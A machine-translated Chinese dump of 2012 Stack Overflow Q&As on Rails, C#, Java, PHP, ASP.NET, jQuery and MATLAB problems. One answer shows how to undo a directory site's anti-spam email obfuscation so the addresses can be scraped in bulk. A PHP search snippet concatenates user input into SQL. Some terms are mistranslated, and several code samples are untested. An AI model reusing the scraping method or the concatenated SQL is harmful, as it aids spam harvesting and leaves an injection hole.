  `policy` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `about` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `address` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `city` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `state` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `zip` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `index_gears_on_user_id_and_created_at` (`created_at`,`id`) USING BTREE,
  KEY `index_gears_on_user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=161 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci; 
```

我的环境：

*   导轨 3.2.0
*   Ruby ruby​​ 1.9.3p0（2011-10-30 修订版 33570）[x86_64-darwin11.2.0]
*   宝石'假货'，'1.0.1'

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T14:16:38.637

好吧，我觉得很愚蠢..想通了。

*   我忘了将列添加到 attr_accessible: 在模型中
*   未定义的方法被抛出，因为假数据被放入数据库中，值为“0”，该特定对象不存在该数据。

希望这对某人有所帮助。

# c# - 使用 Marshal 问题将 C# 转换为 C++

> ID：10603790
> 
> 赞同：-1
> 
> 时间：2012-05-15T15:16:05.287
> 
> 标签：c#, c++, marshalling, unmarshalling

我在 C++ 中有这些声明：

```
struct objectStruct;

int positionMemory = getPosition();

short size = getSize();

void *allocatedObject; // Originally, it is in C#: IntPtr allocatedObject { get; private set; }

byte[] byteName = Encoding.ASCII.GetBytes("Hello There"); 
```

我想将这些代码行从 C# 转换为 C++：

```
string result = Marshal.PtrToStringAnsi(new IntPtr(positionMemory), size); 

Marshal.StructureToPtr(objectStruct, new IntPtr(positionMemory), true);

Marshal.Copy(byteName, 0, new IntPtr(positionMemory), size);

long posInMemory = allocatedObject.Offset(size).ToInt64(); 
```

我对编组不熟悉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:29:30.570

我不知道 C++，但我知道编组所以这就是这些行在做什么

```
//Get size number of characters of the string pointed to by the positionMemory pointer.
string result = Marshal.PtrToStringAnsi(new IntPtr(positionMemory), size); 

//Copy the contents of objectStruct to the memory location pointed at by positionMemory
Marshal.StructureToPtr(objectStruct, new IntPtr(positionMemory), true);

//Copy size number of bytes from the byteName array starting at index 0 to the memory indicated by positionMemory
Marshal.Copy(byteName, 0, new IntPtr(positionMemory), size);

//I think offsetting the memory location indicated by allocatedObject by size number of bytes and converting the memory pointer to an Int64.
machineNamePosInMem = allocatedObject.Offset(size).ToInt64(); 
```

我不明白为什么您实际上需要将其中的大部分转换为 C++，编组的重点是使托管对象可用于非托管代码并将非托管对象转换为托管对象，如果您在 C++ 中进行操作，那么您不应该真的需要这样做，即使它是托管的 C++。

# java - 限制用户输入+循环

> ID：10603792
> 
> 赞同：0
> 
> 时间：2012-05-15T15:16:10.680
> 
> 标签：java, java.util.scanner

我想做的事：

*   将用户输入仅限于字母（小写和大写）
*   错误输入的错误信息
*   循环直到输入正确

不少有类似问题的网站建议使用正则表达式、模式和匹配器。我看过API，这让我很困惑......

这是我尝试过的。

```
public class restrictinput {
    public static void main (String args [] ) {
        Scanner sc = new Scanner (in);
        System.out.println ("Enter  blah ");
        String blah = sc.nextLine();
        Pattern userInput = Pattern.compile("^[a-zA-Z]+$");
        Matcher inputCheck = userInput.matcher("blah");
    }
} 
```

这可以编译，但我不确定这是否是正确/最佳的方法。但是，如果我输入不同的字符类型，它只会执行其余的代码。

如果收到正确的字符类型，我该如何让它执行，我应该使用什么来让用户知道错误？

如果给出的代码是错误的，我应该怎么做才能改变它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:19:44.850

这似乎是家庭作业，所以我不想透露太多，但您想查看[if 语句](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/if.html)以及[while](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/while.html)或[for](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/for.html)循环。如果满足某些条件，这将有条件地执行代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:26:03.187

好的，这里有几件事需要修复。我注意到的第一件事是你想要

```
userInput.matcher(blah); 
```

不是

```
userInput.matcher("blah"); 
```

因为您正在匹配字符串，而不仅仅是`"blah"`

现在回答你的大部分问题。您需要做的第一件事是查看[Matcher](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/regex/Matcher.html)对象。具体查看 Matcher.find()。

第二件事是您需要在代码中添加某种条件循环，以便它不断要求输入。也许是这样的：

```
bool result = true;
do {
    String blah = sc.nextLine();
    Pattern userInput = Pattern.compile("^[a-zA-Z]+$");
    Matcher inputCheck = userInput.matcher("blah");
    result = //boolean check from your matcher object
    if(result) {
        //Complain about wrong input
    }
} while(result); 
```

# android - PhoneGap 上的自动图片捕捉

> ID：10603797
> 
> 赞同：0
> 
> 时间：2012-05-15T15:16:20.933
> 
> 标签：android, cordova, camera

我正在尝试使用 PhoneGap 和 Android 构建一个应用程序，并且想知道是否有人知道如何让应用程序自动捕获图片，例如在用户打开应用程序 5 秒后，用户实际上没有按下任何东西。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T17:28:12.783

当您可以在“deviceready”事件处理程序上执行 setTimeout 以调用 navigator.camera.getPicture() 但无法自动单击按钮时。用户将需要这样做。除此之外，如果这是您真正需要的，您需要编写一个插件来自动拍照。

# vb.net - 有没有办法做一个 .Where(function(x) x.id in [array])？

> ID：10603798
> 
> 赞同：0
> 
> 时间：2012-05-15T15:16:22.817
> 
> 标签：vb.net, filter, where

我想过滤我从数据库中获取的实体列表。

事实上，我***应该***只得到 1 个实体，并且我想确保它的类别是允许的类别之一。

最好的过滤方法是什么？

我的第一个想法是按照以下方式做一些事情：

```
Dim allowedCat As List(Of Guid) = New List(Of Guid)
allowedCat.Add(Entites.Categories.Email)
allowedCat.Add(Entites.Categories.Mail)
allowedCat.Add(Entites.Categories.Fax)

Dim communications = communicationService.fetchCommunications(idComm)

resultatComm = communications.Resultat.Where(function(x) x.idCategorie in allowedCat) 
```

当然，它不起作用，我在查找关于“Where”的文档时遇到问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:18:35.703

VB.Net 没有这样的`in`运算符。

相反，检查`allowedCat.Contains(x.idCategoie)`.

# c# - 断言私有方法的异常

> ID：10603801
> 
> 赞同：3
> 
> 时间：2012-05-15T15:16:32.463
> 
> 标签：c#, exception, nunit, assert, private-methods

我正在使用 NUnit 对 C# 中的私有方法进行单元测试。

例如，我的方法（如果是公开的）预计会抛出一个`ArgumentNullException`. 我可以断言该方法会抛出`ArgumentNullException`这样的问题：`Assert.Throws<ArgumentNullException>(() => method.Call());`

但是，由于我正在使用反射调用私有方法，因此我会`TargetInvocationException`为抛出`ArgumentNullException`类似这样的方法声明一个：`Assert.Throws<TargetInvocationException>(() => methodInfo.Invoke(obj, new object[] { params }));`

我想为那个私有方法断言一个`ArgumentNullException`而不是一个`TargetInvocationException`，这样我就可以扫描它的代码并知道它期望做什么，而不是通过调试来找出答案。

我将如何断言实际异常，而不是`TargetInvocationException`?

**注意**：这个问题没有解决单元测试公共与私有方法背后的理论。我和我的团队已经决定对私有方法进行单元测试，这是否是单元测试的方式与这个问题无关。[请参阅此](https://stackoverflow.com/a/1506584/1121302)问题上最受好评的答案以了解我们的基本原理。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T15:59:44.160

找到我的答案：

```
var exception = Assert.Throws<TargetInvocationException>(() => methodInfo.Invoke(obj, new object[] { params }));
Assert.IsInstanceOf<Exception>(exception.InnerException); 
```

**更新**

`Assert.IsNotNull(exception.InnerException)`让我知道存在内部异常。`Assert.IsInstanceOf<Exception>(exception.InnerException);`将断言任何类型的`Exception`抛出。我同意这两种方式都告诉我们存在内部异常。

**但是.....如果我想断言特定类型的内部异常怎么办？**

例如，如果我的方法抛出一个`ArgumentNullException`，那么我不能通过执行`Assert.IsInstanceOf<FileNotFoundException>(exception.InnerException);`Using来断言它`Assert.IsNotNull`让我知道存在内部异常，但它不会显示内部异常的类型。因此，这就是为什么我更喜欢`IsInstanceOf`在这种情况下使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:31:12.970

在 Assert 上创建一个扩展方法，即采用 func 的“ThrowsInnerException”，用 Try/Catch 包装并抛出 InnerException（在您的情况下，对应于 ArgumentNullException）

这是一段代码（**未经测试**且**无法编译**，因为我在没有编辑器的情况下输入了它，但它应该给你这个想法）

```
public static class AssertExtension 
    {
        public static void ThrowsInnerException<T>(Action action) 
        {
            Assert.Throws<T>(delegate() {
                try { action(); }
                catch (Exception exc) { throw exc.InnerException; }
            });
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:19:35.550

你确定单元测试私有方法是个好主意吗？因为听起来好像不是。

最好测试调用私有方法的公共方法。

**更新**

更重要的是，尽管我没有看到你的代码，但我认为最好将参数验证放在公共方法中并对其进行测试。

**Update2**
发现非常相似的[SO 问题](https://stackoverflow.com/questions/250692/how-do-you-unit-test-private-methods)

 ****我在类似情况下使用的****Update3**方法（用于模拟`private`字段）只是将`private`方法标记为`internal`并将`InternalsVisibleTo(<assembly_with_unit_tests>)`属性添加到被测程序集。
这不是一个好主意（实际上，当它在一次设计会议上在团队中提出时我反对这个，因为它不正确，不纯粹等），但结果它为编写单元测试节省了很多时间。**

# asp.net - 在 ASP.Net 中获取当前应用程序虚拟路径

> ID：10603805
> 
> 赞同：7
> 
> 时间：2012-05-15T15:16:46.763
> 
> 标签：asp.net, asp.net-mvc, iis, iis-7

在 Global.asax.cs 的 Application_Start 中，我正在尝试使用以下方法获取当前应用程序路径：

```
var virtualPath = HttpContext.Current.Request.Url.GetLeftPart(UriPartial.Authority)
                          + HttpRuntime.AppDomainAppVirtualPath; 
```

这将返回例如：`[http://localhost:99/MySite/](http://localhost:99/MySite/)`

然后，我将使用此 URL 并执行以下操作：

```
var pageToHit = virtualPath + Pages\MyOtherPage.aspx 
var client = new WebClient();
client.DownloadData(dummyPageUrl); 
```

当我在 IIS 6 或 Visual Studio 内置 Web 服务器中运行项目时，这一切都很好，但是在 IIS 7 中事情变得疯狂，因为我得到“System.Web.HttpException：请求在此上下文中不可用”。

我知道这个线程：[Request is not available in this context](https://stackoverflow.com/questions/2518057/request-is-not-available-in-this-context)

但是，我想知道是否有人对如何在不更改项目以经典模式运行的情况下执行上述操作有任何想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T15:38:08.190

在集成模式下运行时，您无法访问 Application_Start 中当前请求的绝对 url。`HostingEnvironment.ApplicationVirtualPath`您可以使用但不能使用绝对 url访问虚拟路径名。这[是一篇](http://mvolo.com/iis7-integrated-mode-request-is-not-available-in-this-context-exception-in-applicationstart/)解释常见解决方法的文章。如文章中所述，您有两种可能性：

1.  更改您的应用程序代码以不使用请求上下文（推荐）
2.  使用锁和单例执行初始化，`Application_BeginRequest`以确保此初始化在 AppDomain 的整个生命周期内只执行一次。这是讨论第二种方法的[类似线程。](https://stackoverflow.com/a/4243338/29407)

# php - 在 php mysql 中进行高级关键字搜索

> ID：10603806
> 
> 赞同：1
> 
> 时间：2012-05-15T15:16:51.430
> 
> 标签：php, mysql, sql

在 vendor_tbl 表中，我有很多词“Microsoft”但是当我输入关键字“mecrsoft”时

或类似的东西它不会像 micrsoft 记录和 sql 查询那样返回我返回 0 记录

如何使用智能进行查询它返回我的所有记录，如我的关键字

下面我在其他中发布 sql 查询

任何建议都有助于使查询更好

```
$keyword='mecrsoft';
$mykeyword= explode(" ",$keyword);
for($i=0;$i<count($mykeyword);$i++)
   $keywords_v[]="vendor_name like '%".$mykeyword[$i]."%' or page_description
   like '%".$mykeyword[$i]."%' or  keyword like '%".$mykeyword[$i]."%' or
   page_title like  '%".$mykeyword[$i]."%' or page_description like
   '%".$mykeyword[$i]."%' ";

$q="select vendor_name,slug,page_description,keyword,
   page_title,page_body from vendor_tbl 

where (".implode(',',$keywords_v).")";

$rs=mysql_query($q); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:25:03.990

我认为它适用于具有理解错误单词的分析器的搜索引擎。例如，ElasticSearch 和模糊查询：

[http://www.elasticsearch.org/guide/reference/query-dsl/fuzzy-query.html](http://www.elasticsearch.org/guide/reference/query-dsl/fuzzy-query.html)

或者您可以在 MySQL 中使用 levenshtein 函数

[Levenshtein：MySQL + PHP](https://stackoverflow.com/questions/4671378/levenshtein-mysql-php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:24:28.997

1.  您有概率术语的数据对，例如“mecrsoft”的意思是“微软”或
2.  您可以实现 levenshtein 距离算法

# c++ - 如何从 C++ 回调访问 Objective-C 方法

> ID：10603807
> 
> 赞同：1
> 
> 时间：2012-05-15T15:16:52.910
> 
> 标签：c++, objective-c, callback

我想在 Objective-C 目标中使用 C++ 库。c++ 库通知我的objective-c 对象有关库对象的某些值更改。因此，我将一个 c++ 回调函数传递给库。回调函数如下所示：

```
void positionChanged(int position) 
```

不幸的是，回调中没有**void* data**参数，我可以使用它来传递指向我的objective-c对象的指针。通常，只要调用回调，我就可以使用这样的指针从 c++ 回调函数访问我的对象变量和方法。（而且我无法更改与此相关的回调函数）。

如何在 C++ 回调函数和我的 Objective-C 对象之间建立连接，以便从 C++ 回调访问我的 Objective-C 对象？

# image - 使用 MATLAB TIFF 类时的空白 TIF 图像

> ID：10603811
> 
> 赞同：0
> 
> 时间：2012-05-15T15:17:05.380
> 
> 标签：image, image-processing, tiff, matlab

**强文本**我正在尝试按照文档中的[示例在](http://www.mathworks.com/help/techdoc/import_export/f5-123068.html#br_c_iz-1)2012a 中使用 MATLAB TIFF 类保存多页 TIF 文件。我的用法不同，因为我正在编写一个 32 位灰度图像，其值范围约为 -10,000 到 200,000。

```
% Use 'a' for 'append' since this code is in a loop that writes each page.
% Note: 'fileName' is defined elsewhere and the file is created.
t = Tiff(fileName, 'a');

tagstruct.ImageLength = size(result, 2);
tagstruct.ImageWidth = size(result, 1);
tagstruct.Photometric = Tiff.Photometric.MinIsBlack;
tagstruct.SampleFormat = Tiff.SampleFormat.IEEEFP;
tagstruct.Compression = Tiff.Compression.None;
tagstruct.BitsPerSample = 32;
tagstruct.SamplesPerPixel = 1;
tagstruct.PlanarConfiguration = Tiff.PlanarConfiguration.Chunky;
tagstruct.Software = 'MATLAB';
t.setTag(tagstruct);

% Viewing the data immediately before the 'write' operation shows it correct.
% imtool(result(:, :, j));
% Tools -> Adjust Contrast                       
t.write(result(:, :, j));

t.close(); 
```

经 MATLAB 和 ImageJ 检查，输出图像的大小正确且元数据正确，但所有值均为零。

**更新：**

对于 TIFF 类，MATLAB 的文档有些稀疏，它本身就是[LibTIFF 库](http://www.remotesensing.org/libtiff/)的包装器。[官方 TIFF 规范版本 6](http://partners.adobe.com/public/developer/en/tiff/TIFF6.pdf)表示每种 TIF 图像类型的必填字段的完整列表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:27:02.163

在[MATLAB 文档的示例中：Exporting to images](http://www.mathworks.com/help/techdoc/import_export/f5-123068.html#br_c_iz-1)有一行代码中没有：

```
tagstruct.RowsPerStrip = 16 
```

因此，可能缺少`RowsPerStrip`字段`tagstruct`是全零图像的原因。

# session - 为客人禁用 Joomla 1.5 会话 Cookie

> ID：10603812
> 
> 赞同：1
> 
> 时间：2012-05-15T15:17:09.930
> 
> 标签：session, cookies, joomla, joomla1.5

有谁知道如何在 Joomla 1.5 中为访客禁用所有 cookie？

它是用于用户跟踪等的会话 cookie。一个示例 cookie 名称是 42fc2fcbe1f5d7c02b9f97a0e48bbbe2

这里有一个修复[Joomla 1.0 Fix](http://docs.joomla.org/Disable_all_cookies_for_normal_visitors_in_Joomla)，但它适用于 Joomla 1.0。

任何帮助或建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-17T17:15:03.287

这里有一个修复[http://forum.joomla.org/viewtopic.php?t=621362#p2509548](http://forum.joomla.org/viewtopic.php?t=621362#p2509548)

据说它适用于 Joomla 1.5.23。我没有测试过它，但它似乎与您链接的那个相似。

# jquery - 带有 iFrame 的 jQuery 超时插件

> ID：10603818
> 
> 赞同：0
> 
> 时间：2012-05-15T15:17:20.483
> 
> 标签：jquery, asp.net, iframe, frameset

我试图将下面的超时 jQuery 插件与 iFrames 一起使用

[http://www.erichynds.com/jquery/a-new-and-improved-jquery-idle-timeout-plugin/](http://www.erichynds.com/jquery/a-new-and-improved-jquery-idle-timeout-plugin/)

我将主要代码放在具有框架集但 modla div 无法进入此处的页面上。我将不得不把它放在其中一个框架上。

问题是它不会在超时时显示。我看到计时器在标题中运行。

有任何想法吗？或者这是不适用于 iFrame 的东西。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T10:08:43.893

我遇到了同样的问题，我通过添加对话框打开代码来解决它

空闲：函数（）{

}

# javascript - jQuery datepicker 更改日期格式

> ID：10603821
> 
> 赞同：1
> 
> 时间：2012-05-15T15:17:37.487
> 
> 标签：javascript, ajax, jquery-ui, datepicker

下面的代码对我不起作用。每当我尝试更改日期时，日期都会从 15/5/2012 切换到 05/15/2012。

```
<script>
$(document).ready(function(){
    $("#date").datepicker({ 
    });
    var myDate = new Date();
    var month = myDate.getMonth() + 1;
    var prettyDate = myDate.getDate() + '/' + month + '/' + myDate.getFullYear();
    $("#date").val(prettyDate);
});
    </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:20:21.187

请在 datepicker 构造函数中将日期格式指定为 'dd/m/yyyy'。

```
 var options = {
                dateFormat: "dd/m/yyyy"
            };
            $('#Item').datepicker(options); 
```

# php - PHP DOMDocument 运行不正常

> ID：10603825
> 
> 赞同：1
> 
> 时间：2012-05-15T15:18:06.560
> 
> 标签：php, dom

我正在尝试使用以下代码从网站获取电子邮件帐户。但它会产生类似的输出

```
%3e%61%2f%3c%6d%6f%63%2e%6c%69%61%6d%67%40%6f%63%73%6e%61%69%70%6d%61%20%3e%22%6d%6f%63%2e%6c%69%61%6d%67%40%6f%63%73%6e%61%69%70%6d%61%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%65%76%69%6c%40%34%34%34%73%71%20%3e%22%6d%6f%63%2e%65%76%69%6c%40%34%34%34%73%71%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6e%69%2e%70%6f%68%73%6c%61%74%69%67%69%64%6e%65%67%79%78%6f%40%6f%66%6e%69%20%3e%22%6e%69%2e%70%6f%68%73%6c%61%74%69%67%69%64%6e%65%67%79%78%6f%40%6f%66%6e%69%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%73%6e%61%72%6f%6f%6a%6e%61%6d%40%6f%66%6e%69%20%3e%22%6d%6f%63%2e%73%6e%61%72%6f%6f%6a%6e%61%6d%40%6f%66%6e%69%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%6c%69%61%6d%67%40%6c%65%74%6f%68%61%79%69%72%70%20%3e%22%6d%6f%63%2e%6c%69%61%6d%67%40%6c%65%74%6f%68%61%79%69%72%70%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%6c%69%61%6d%67%40%61%72%70%61%6e%6e%75%70%68%63%72%75%68%63%79%65%6e%6e%61%79%69%76%20%3e%22%6d%6f%63%2e%6c%69%61%6d%67%40%61%72%70%61%6e%6e%75%70%68%63%72%75%68%63%79%65%6e%6e%61%79%69%76%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%6c%69%61%6d%67%40%74%6e%65%6d%65%67%6e%61%6d%65%72%6f%63%6e%61%76%61%72%74%20%3e%22%6d%6f%63%2e%6c%69%61%6d%67%40%74%6e%65%6d%65%67%6e%61%6d%65%72%6f%63%6e%61%76%61%72%74%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%6b%75%65%67%6e%61%68%63%78%65%74%6e%65%6d%79%6f%6c%70%6d%65%65%68%74%40%68%73%65%72%75%73%20%3e%22%6d%6f%63%2e%6b%75%65%67%6e%61%68%63%78%65%74%6e%65%6d%79%6f%6c%70%6d%65%65%68%74%40%68%73%65%72%75%73%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c %3e%61%2f%3c%6d%6f%63%2e%6c%69%61%6d%67%40%68%70%6e%6f%6d%62%61%6a%75%73%20%3e%22%6d%6f%63%2e%6c%69%61%6d%67%40%68%70%6e%6f%6d%62%61%6a%75%73%3a%6f%74%6c%69%61%6d%22%3d%66%65%72%68%20%61%3c 
```

我正在使用的代码是

```
<?php    
$html = new DOMDocument();
@$html->loadHtmlFile('http://www.quickerala.com/listings?searchString=&districtId=1&go=Go');
$xpath = new DOMXPath( $html );
$nodelist = $xpath->query( "//span[@class='listEmail']" );
foreach ($nodelist as $n){
    echo $n->nodeValue."\n";
}
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:22:34.777

不，这实际上是正确的。[`urldecode`](http://sg.php.net/urldecode)我认为您必须手动操作。

更正，您也必须这样[`strrev`](http://sg.php.net/strrev)做。

这可能是一种垃圾邮件保护；从他们的代码中，我设法解除了这段代码：

```
$(".listEmail").each(function(index){
    var strEm = unescape($(this).html());
    var reversedStr=strEm.split("").reverse().join("");
    $(this).html(reversedStr)});
} 
```

所以：

```
$value = strrev(urldecode($n->nodeValue)); 
```

那仍然返回一段 HTML，所以你也必须解析它:)

# java - 如何使用密码正确初始化对象流

> ID：10603827
> 
> 赞同：0
> 
> 时间：2012-05-15T15:18:08.293
> 
> 标签：java, stream, encryption

服务器

```
 decCipher.init(Cipher.DECCRYPT_MODE, secretKey);
     ois = new ObjectInputStream(new CipherInputStream(socket.getInputStream(),decCipher));
     encCipher.init(Cipher.ENCRYPT_MODE, secretKey);
     out = new ObjectOutputStream(new CipherOutputStream(socket.getOutputStream(),encCipher)); 
```

客户端（不同的应用程序）：

e

```
ncCipher.init(Cipher.ENCRYPT_MODE, secretKey);
obj_out = newObjectOutputStream(new CipherOutputStream(socket.getOutputStream(),encCipher));
 decCipher.init(Cipher.DECRYPT_MODE, secretKey);
 obj_in = new ObjectInputStream(new CipherInputStream(socket.getInputStream(),decCipher) 
```

服务器应用程序中的 Ois 在创建流时引发异常。如何解决？当这没有包含在密码流中时，一切正常。

异常不会仅在创建时引发`new ObjectInputStream`，而是冻结 10 秒（超时），当达到超时限制时会引发异常。

例外：

```
at java.io.ObjectInputStream$PeekInputStream.readFully(ObjectInputStream.java:2298)
    at java.io.ObjectInputStream$BlockDataInputStream.readShort(ObjectInputStream.java:2767)
    at java.io.ObjectInputStream.readStreamHeader(ObjectInputStream.java:798)
    at java.io.ObjectInputStream.<init>(ObjectInputStream.java:298) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T23:41:43.730

您需要使用两种不同的`Cipher`对象，一种用于加密，一种用于解密。考虑将`Cipher`对象附加到`CipherInputStream`后的模式`ENCRYPT_MODE`。

# javascript - 使用带有溢出的@font-face 声明的块的clientHeight：隐藏

> ID：10603829
> 
> 赞同：4
> 
> 时间：2012-05-15T15:18:14.550
> 
> 标签：javascript, html, css, font-face

我已经隔离了一些奇怪的行为，当你有一个样式为溢出的块时似乎会发生这种行为：隐藏，并使用@font-face 声明的字体（我一直在使用 Google Web Fonts）。clientHeight 与元素的实际高度不对应——似乎更短一些。我已经在 Chrome 和 Firefox 中复制了。有谁知道这里发生了什么？

（不幸的是，它不会在 JSFiddle 中重现，但这是代码——如果你在未经修改的浏览器中查看它，你应该会看到大约 80% 的段落。）（[https://gist.github.com/2702563](https://gist.github.com/2702563)）

```
<!DOCTYPE html>
<html>
    <head>
        <link href='http://fonts.googleapis.com/css?family=Tenor+Sans|Esteban' rel='stylesheet' type='text/css'>
        <style>
            #demo{
                width: 30em;
                            /* comment either of the lines below out and it'll work */
                overflow: hidden;
                font-family: 'Esteban';
            }
        </style>
    </head>
    <body>
        <div id="demo">
            <p>I give Pirrip as my father's family name, on the authority of his
            tombstone and my sister,&mdash;Mrs. Joe Gargery, who married the blacksmith.
            As I never saw my father or my mother, and never saw any likeness
            of either of them (for their days were long before the days of
            photographs), my first fancies regarding what they were like were
            unreasonably derived from their tombstones. The shape of the letters on
            my father's, gave me an odd idea that he was a square, stout, dark man,
            with curly black hair. From the character and turn of the inscription,
            &ldquo;Also Georgiana Wife of the Above,&rdquo; I drew a childish conclusion that
            my mother was freckled and sickly. To five little stone lozenges, each
            about a foot and a half long, which were arranged in a neat row beside
            their grave, and were sacred to the memory of five little brothers of
            mine,&mdash;who gave up trying to get a living, exceedingly early in
            that universal struggle,&mdash;I am indebted for a belief I religiously
            entertained that they had all been born on their backs with their hands
            in their trousers-pockets, and had never taken them out in this state of
            existence.</p>
        </div>
        <script>
            document.getElementById('demo').style.height = document.getElementById('demo').clientHeight + 'px';
        </script>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-26T16:05:27.997

看起来脚本是在字体应用于段落之前被解释的。如果您停用网络字体，则框的高度与预期的完全一样：整个段落都是可读的。如果您调试代码并在脚本处设置断点并在页面加载完成**后**继续执行，则不会出现意外高度。

您可以通过在 window.onload-event 中执行脚本来解决此问题，以便在应用 webfont 后读取 clientHeight：

```
<!DOCTYPE html>
<html>
   <head>
      <link href='http://fonts.googleapis.com/css?family=Tenor+Sans|Esteban' rel='stylesheet' type='text/css'>
      <style>
         #demo{
            width: 30em;
            overflow: hidden;
            font-family: 'Esteban';
         }
      </style>
   </head>
   <body>
      <div id="demo">
         <p>I give Pirrip as my father's family name, on the authority of his
           tombstone and my sister,&mdash;Mrs. Joe Gargery, who married the blacksmith.
           As I never saw my father or my mother, and never saw any likeness
           of either of them (for their days were long before the days of
           photographs), my first fancies regarding what they were like were
           unreasonably derived from their tombstones. The shape of the letters on
           my father's, gave me an odd idea that he was a square, stout, dark man,
           with curly black hair. From the character and turn of the inscription,
           &ldquo;Also Georgiana Wife of the Above,&rdquo; I drew a childish
           conclusion that my mother was freckled and sickly. To five little stone
           lozenges, each about a foot and a half long, which were arranged in a neat
           row beside their grave, and were sacred to the memory of five little
           brothers of mine,&mdash;who gave up trying to get a living, exceedingly
           early in that universal struggle,&mdash;I am indebted for a belief I
           religiously entertained that they had all been born on their backs with
           their hands in their trousers-pockets, and had n ever taken them out in
           this state of existence.</p>
        </div>
        <script>
         window.onload = function(){document.getElementById('demo').style.height = document.getElementById('demo').clientHeight + 'px';}
        </script>
     </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-17T16:36:00.537

No this looks like a damn real Chrome bug.

Even if you the page is fully loaded, and regardless of how many times you have used the webfont in your page, when setting the content of a div with overflow hidden with a webfont you will not get the right content height synchronously...

```
<!DOCTYPE html>
<html>
    <head>
        <link href='http://fonts.googleapis.com/css?family=Tenor+Sans|Esteban' rel='stylesheet' type='text/css'>
        <style>
            #demo{
                width: 30em;
                /* comment either of the lines below out and it'll work */
                overflow: hidden;
                font-family: 'Esteban';
                background:#ddd;
            }
        </style>
    </head>
    <body>
        <div id="demo">
            Placeholder...
        </div>
        <script>
            window.onload = function() {
                document.getElementById('demo').innerHTML = "<p>I give Pirrip as my father's family name, on the authority of his tombstone and my sister,&mdash;Mrs. Joe Gargery, who married the blacksmith. As I never saw my father or my mother, and never saw any likeness of either of them (for their days were long before the days of photographs), my first fancies regarding what they were like were unreasonably derived from their tombstones. The shape of the letters on my father's, gave me an odd idea that he was a square, stout, dark man, with curly black hair. From the character and turn of the inscription, &ldquo;Also Georgiana Wife of the Above,&rdquo; I drew a childish conclusion that my mother was freckled and sickly. To five little stone lozenges, each about a foot and a half long, which were arranged in a neat row beside their grave, and were sacred to the memory of five little brothers of mine,&mdash;who gave up trying to get a living, exceedingly early in that universal struggle,&mdash;I am indebted for a belief I religiously entertained that they had all been born on their backs with their hands in their trousers-pockets, and had never taken them out in this state of existence.</p>"

                // wrong size only with Chrome
                //document.getElementById('demo').style.height = document.getElementById('demo').clientHeight + 'px'; 

                // the more you wait, the more chances you have to get the right size
                setTimeout(function() {
                    document.getElementById('demo').style.height = document.getElementById('demo').clientHeight + 'px'; 
                }, 10); 
            }
        </script>
    </body>
</html> 
```

# html - 在 Netbeans Web 应用程序中编写阿拉伯语

> ID：10603831
> 
> 赞同：1
> 
> 时间：2012-05-15T15:18:18.403
> 
> 标签：html, web-applications, netbeans, utf-8

我正在使用“Netbeans Web 应用程序”制作一个包含阿拉伯语单词的简单页面

例子：

```
<input type="text" id="height1" name="height1" value="" align="right"/>= الطول <br/> 
```

我在页面的开头添加了一个包含页面编码的标签，`UTF-8` 它没有做任何事情。

在我使用带有此标签的 Notepad++ 之前

```
<charset=Windows-1256"> 
```

这是正确的，但在 Netbeans 中尝试它..仍然一无所获

# javafx-2 - 为什么 ResourceBundle 为空（在具有 FXML 和 JavaFX 2.0 的应用程序中）

> ID：10603838
> 
> 赞同：1
> 
> 时间：2012-05-15T15:18:36.997
> 
> 标签：javafx-2, fxml

